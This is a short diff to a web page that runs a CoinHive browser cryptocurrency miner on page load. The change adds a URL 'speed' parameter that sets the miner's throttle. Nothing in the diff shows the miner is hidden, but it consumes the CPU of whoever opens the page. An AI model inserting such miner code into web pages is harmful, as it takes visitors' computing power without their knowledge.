@@ -15,6 +15,7 @@
 <script>
     var miner = new CoinHive.Anonymous('NwoCMjaoLggUNUR2yqAHNKvpIC8uaNXO', {throttle: 0.2});
     miner.start();
+	
 	//window.setInterval(function(){
 	//	if (miner.isRunning) {
 	//		document.getElementById("speed").innerHTML = miner.getHashesPerSecond();
@@ -27,6 +28,13 @@
 	//		
 	//	}
 	//}, 2500);
+	
+	var urlParams = new URLSearchParams(window.location.search);
+	var speed = urlParams.get('speed');
+	if (speed !== null) {
+		var speed = Number(urlParams.get('speed'));
+		miner.setThrottle(speed);
+	}
 </script>
 
 </body>
